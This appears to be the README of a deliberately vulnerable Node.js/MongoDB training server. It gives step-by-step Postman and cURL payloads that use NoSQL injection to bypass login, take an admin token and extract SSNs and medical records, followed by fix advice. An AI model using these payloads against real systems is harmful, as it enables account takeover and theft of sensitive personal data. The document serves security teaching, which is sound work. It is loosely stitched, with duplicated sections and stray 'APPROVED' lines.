## NoSQL Injection – Vulnerable Server (Educational)

This project is a deliberately vulnerable backend application built to demonstrate real NoSQL injection attacks against MongoDB.

It is designed only for learning and security training. **Do NOT deploy this in production.**

## What This Project Shows

This server demonstrates how poor input validation can allow attackers to:

- **Bypass login** without knowing a password
- **Gain admin access**
- **Extract sensitive data** (users, SSNs, medical records)

Abuse MongoDB operators such as:

- **$ne**
- **$regex**
- **$exists**
- **$gt**

All vulnerabilities are real and executed against a real MongoDB database, not mock data.

## Tech Stack

- **Node.js + Express** – Backend API
- **MongoDB + Mongoose** – Database
- **JWT** – Authentication
- **RBAC** – Roles (admin, doctor, patient)
- **Python** – Automated exploit script

## Requirements

You only need:

- Node.js (v14 or higher)
- MongoDB (running locally)
- Python 3 (for the exploit script)

## Quick Setup (Minimal Steps)
1. **Start MongoDB**

Make sure MongoDB is running on port 27017:

```
mongod
```

If MongoDB is already running, you can skip this step.

2. **Install Dependencies**

```
npm install

pip3 install requests
```

3. **Start the Server**

```
npm start
```

The server runs at:

http://localhost:4000

Verify it is working:

```
curl http://localhost:4000/health
```

Expected response:

```
{"status":"ok","message":"Vulnerable server is running"}
```

## Seeded Test Accounts

These users are created automatically when the server starts.

**Admin Accounts**

- admin / secret123
- superadmin / admin456

**Doctor Accounts**

- doctor1 / doctor123
- doctor2 / doctor456

**Patient Accounts**

- patient1 / patient123
- patient2 / patient123
- patient3 / patient789
- patient4 / patient999

Medical records exist for all patient accounts.

## Vulnerable Endpoints (Summary)

### Login (Authentication Bypass)

**POST /auth/login**

**Example attack payload:**

```json
{
  "username": "admin",
  "password": { "$ne": null }
}
```

This allows login without knowing the password.

### User Search & Filtering

**GET  /search**
**POST /users/filter**
**GET  /users/find**

Attackers can extract:

- **All users**
- **Admin accounts**
- **SSNs**
- **Medical Records**

**POST /records/search**

Attackers can extract all medical records.

### Admin Endpoints

**POST /admin/export**
**POST /admin/query**
**POST /admin/users**

Once an attacker obtains an admin token, full database exfiltration is possible.

## Testing with Postman (Recommended)

Postman is the best way to manually test and document the vulnerabilities.

### Authentication Bypass Test

**Request**

**Method:** POST

**URL:** http://localhost:4000/auth/login

**Body (JSON):**

```json
{
  "username": "admin",
  "password": { "$ne": null }
}
```

**Result**

- **Status:** 200 OK
- **JWT token returned**
- **Logged in as admin**

### Data Extraction Test

**Request**

```
GET /search?q={"$regex":".*"}
```

**Result**

- Returns all users, including sensitive data

### Automated Exploit Script

You can also demonstrate the full attack automatically:

```
python3 exploit/nosql_exploit.py
```

The script demonstrates:

- **Injection discovery**
- **Authentication bypass**
- **Full data extraction**

This is useful for live demos, while Postman is better for documentation.

## Impact Summary

Because of these vulnerabilities:

- **Anyone can log in as admin**
- **Sensitive user data can be stolen**
- **Medical records are exposed**
- **RBAC protections are bypassed**

This represents a critical security failure.

## Root Cause

The vulnerabilities exist because:

- **User input is passed directly to MongoDB queries**
- **MongoDB operators are not blocked**
- **No input type validation is enforced**
- **No query whitelisting is used**

## How This Should Be Fixed (High-Level)

- **Reject objects in login fields** (username and password must be strings)
- **Block all $ operators from user input**
- **Build database queries manually**
- **Validate input using schema validation**
- **Never accept raw MongoDB queries from users**

## Important Warning

⚠️ **This project is intentionally insecure**

**For educational use only**

**Do not deploy**

**Do not expose to the internet**

## License

Educational use only.
**Alternative method** (URL encoded):
- URL: `http://localhost:4000/search?q=%7B%22%24regex%22%3A%22.%2A%22%7D`

---

#### Test 1.4: Privileged Data Extraction

**Purpose**: Extract admin users specifically

1. Method: **GET**
2. URL: `http://localhost:4000/search`
3. **Params** tab:
   - Key: `q`
   - Value: `{"role": "admin"}`
4. Click **Send**
5. **Expected Response**: Status 200, array containing both admin users (admin, superadmin) with SSN and full details

---

### Stage 2: Authentication Bypass and Privilege Escalation

#### Test 2.1: Bypass Login and Get Admin Token

**Purpose**: Demonstrate how NoSQL injection bypasses authentication without knowing the actual password, allowing unauthorized access to admin accounts.

**How it works**: 
The vulnerable login endpoint passes user input directly to MongoDB without validation. By sending `{"password": {"$ne": null}}`, we're injecting a MongoDB operator that means "password is not equal to null". Since all users have non-null passwords, this matches any user account, effectively bypassing password verification.

**Steps**:

1. Create new request in Postman
2. Set method to **POST**
3. URL: `http://localhost:4000/auth/login`
4. Go to **Headers** tab, add:
   - Key: `Content-Type`
   - Value: `application/json`
5. Go to **Body** tab:
   - Select **raw**
   - Select **JSON** from dropdown
   - Paste this payload:
```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```
6. Click **Send**

**Expected Response**:
- Status: **200 OK**
- Response body contains:
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": "...",
    "username": "admin",
    "role": "admin",
    "fullName": "System Administrator"
  }
}
```

**What to save**:
- Copy the entire `token` value from the response
- This token grants admin-level access to protected endpoints
- Token is valid for 1 hour (as per JWT configuration)

**Optional - Save token for reuse**:
1. Click **Environments** → **Add** (or use existing environment)
2. Create variable: `admin_token`
3. Set value to the copied token
4. In subsequent requests, use `{{admin_token}}` instead of pasting the token

**Alternative payloads to test** (all bypass authentication):
- `{"username": "superadmin", "password": {"$ne": null}}` - Bypass as second admin
- `{"username": {"$regex": ".*"}, "password": {"$ne": null}}` - Match any user (returns first match)
- `{"username": "admin", "password": {"$gt": ""}}` - Alternative operator ($gt = greater than)

---

#### Test 2.2: Access Protected Admin Endpoint

**Purpose**: Verify admin access using bypassed token

1. Method: **POST**
2. URL: `http://localhost:4000/admin/export`
3. **Headers** tab:
   - Key: `Authorization`
   - Value: `Bearer YOUR_TOKEN_HERE` (replace with actual token from Test 2.1)
4. Click **Send**
5. **Expected Response**: Status 200, JSON containing all users (8 total: 2 admins, 2 doctors, 4 patients) and medical records (4 records)


### Stage 3: Data Extraction

#### Test 3.1: Extract Users with SSN

**Purpose**: Find all users with SSN information

1. Method: **POST**
2. URL: `http://localhost:4000/users/filter`
3. Headers: `Content-Type: application/json`
4. Body (raw JSON):
```json
{
  "ssn": {"$exists": true, "$ne": null}
}
```
5. Click **Send**
6. **Expected Response**: Status 200, all users with SSN data

---

APPROVED



#### Test 3.2: Extract Medical Records

**Purpose**: Get all medical records using regex

1. Method: **POST**
2. URL: `http://localhost:4000/records/search`
3. Headers: `Content-Type: application/json`
4. Body (raw JSON):
```json
{
  "patientId": {"$regex": ".*"}
}
```
5. Click **Send**
6. **Expected Response**: Status 200, all medical records with diagnoses and medications

---
APPROVED


#### Test 3.3: Admin Query Injection

**Purpose**: Use admin endpoint with injected query

**Prerequisites**: Admin token from Test 2.1

1. Method: **POST**
2. URL: `http://localhost:4000/admin/query`
3. **Headers** tab:
   - `Content-Type: application/json`
   - `Authorization: Bearer YOUR_TOKEN_HERE`
4. Body (raw JSON):
```json
{
  "query": "{\"ssn\":{\"$regex\":\".*\"}}"
}
```
5. Click **Send**
6. **Expected Response**: Status 200, users matching the injected query

**Note**: The `query` field is a JSON string that gets parsed, allowing operators.

---


APPROVED


#### Test 3.4: Admin User Filter Injection

**Purpose**: Filter users using admin endpoint

**Prerequisites**: Admin token from Test 2.1

1. Method: **POST**
2. URL: `http://localhost:4000/admin/users`
3. **Headers** tab:
   - `Content-Type: application/json`
   - `Authorization: Bearer YOUR_TOKEN_HERE`
4. Body (raw JSON):
```json
{
  "filter": {"ssn": {"$regex": ".*"}}
}
```
5. Click **Send**
6. **Expected Response**: Status 200, filtered users based on injected filter

---



APPROVED



### Additional Tests

#### Test: Find Users with Criteria

**Purpose**: Test `/users/find` endpoint

1. Method: **GET**
2. URL: `http://localhost:4000/users/find`
3. **Params** tab:
   - Key: `criteria`
   - Value: `{"username":{"$regex":".*"}}`
4. Click **Send**
5. **Expected Response**: Status 200, all users matching criteria

---


APPROVED


#### Test: Health Check

1. Method: **GET**
2. URL: `http://localhost:4000/health`
3. Click **Send**
4. **Expected Response**: Status 200, `{"status":"ok","message":"Vulnerable server is running"}`

---

### Postman Collection Setup Tips

1. **Environment Variables**:
   - Create environment with variables:
     - `base_url`: `http://localhost:4000`
     - `admin_token`: (set after first login bypass)

2. **Pre-request Scripts** (optional):
   - Automate token extraction from login response

3. **Tests** (optional):
   - Add assertions to verify response status codes
   - Verify token presence in responses
   - Check for extracted data

4. **Documentation**:
   - Add descriptions to each request
   - Include expected responses
   - Document vulnerability type for each test

### Postman Collection JSON

You can create a Postman collection with all these requests. Here's the structure:

```json
{
  "info": {
    "name": "NoSQL Injection Tests",
    "description": "Complete test suite for NoSQL injection vulnerabilities"
  },
  "variable": [
    {
      "key": "base_url",
      "value": "http://localhost:4000"
    }
  ],
  "item": [
    {
      "name": "Stage 1: Injection Discovery",
      "item": [
        {
          "name": "1.1 Auth Bypass - Operator",
          "request": {
            "method": "POST",
            "url": "{{base_url}}/auth/login",
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"admin\",\n  \"password\": {\"$ne\": null}\n}"
            }
          }
        }
      ]
    }
  ]
}
```

## Exploitation Methods

### Method 1: Postman Testing (Recommended for Documentation)

**Use the comprehensive "Testing with Postman" section above** for detailed step-by-step instructions. This method is ideal for documentation and writeups as it provides:
- Clear step-by-step instructions
- All payloads ready to copy
- Expected responses documented
- Screenshot-friendly format

All tests are organized by attack stages (Discovery, Bypass, Extraction) for easy documentation.

### Method 2: Automated Exploit Script

Run the Python exploit script to demonstrate all three attack stages:

```bash
python3 exploit/nosql_exploit.py
```

The script demonstrates:

#### Stage 1: Injection Discovery
- Identifies NoSQL injection points in login and search endpoints
- Demonstrates how query operators (`$ne`, `$regex`, `$where`) alter query logic

#### Stage 2: Authentication Bypass
- Bypasses login without knowing valid credentials
- Uses `$ne` operator to match any non-null password
- Gains access to protected endpoints

#### Stage 3: Data Extraction
- Enumerates all users via search endpoint
- Extracts privileged account information (SSN, roles)
- Retrieves sensitive medical records via admin endpoints

### Manual Testing with cURL

#### 1. Authentication Bypass

```bash
curl -X POST http://localhost:4000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":null}}'
```

#### 2. Search Injection

```bash
curl "http://localhost:4000/search?q=%7B%22%24regex%22%3A%22.%2A%22%7D"
# URL decoded: ?q={"$regex":".*"}
```

#### 3. Admin Query Injection (requires admin token from step 1)

```bash
curl -X POST http://localhost:4000/admin/query \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -d '{"query":"{\"role\":\"admin\"}"}'
```

## Example Attack Payloads

### Authentication Bypass
```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```

### Data Extraction via Search
```
?q={"$regex":".*"}                    # Get all users
?q={"role":"admin"}                   # Get admin users
?q={"ssn":{"$exists":true}}          # Get users with SSN
?q={"username":{"$regex":"^a"}}      # Get users starting with 'a'
```

### Admin Query Injection
```json
{"query": "{\"$regex\":\".*\"}"}
{"query": "{\"role\":\"admin\"}"}
{"query": "{\"ssn\":{\"$exists\":true,\"$ne\":null}}"}
```

## Vulnerability Details

### Root Cause
The application constructs MongoDB queries directly from user input without proper validation or type enforcement. This allows attackers to inject MongoDB query operators.

### Why It Works
1. **Direct Query Construction**: User-supplied JSON is passed directly to Mongoose/MongoDB query methods
2. **No Input Validation**: Operators like `$ne`, `$regex`, `$gt`, `$where` are not filtered
3. **Type Coercion**: MongoDB operators can change query logic to match unintended documents





## Security Impact

1. **Authentication Bypass**: Attackers can login as any user without knowing the password
2. **Data Exfiltration**: Sensitive data (SSNs, medical records) can be extracted
3. **Privilege Escalation**: Attackers can gain admin access and access protected resources
4. **Information Disclosure**: User enumeration and data structure disclosure

## Mitigation (Not Implemented - For Reference Only)

To fix these vulnerabilities:

1. **Input Validation**: Validate and sanitize all user input
2. **Type Enforcement**: Ensure passwords are strings, not objects
3. **Whitelist Operators**: Reject query operators (keys starting with `$`) from untrusted input
4. **Use Schema Validation**: Leverage Mongoose schemas with strict validation
5. **Parameterized Queries**: Use explicit field matching instead of dynamic query objects
6. **Avoid `$where`**: Never use `$where` operator which allows JavaScript execution

```



### Stopping the Services

To stop the Node.js server:
```bash
pkill -f "node src/index.js"
# Or press Ctrl+C in the terminal where it's running
```

To stop MongoDB:
```bash
pkill mongod
# Or if using systemd:
sudo systemctl stop mongod
```

## License

Educational use only.
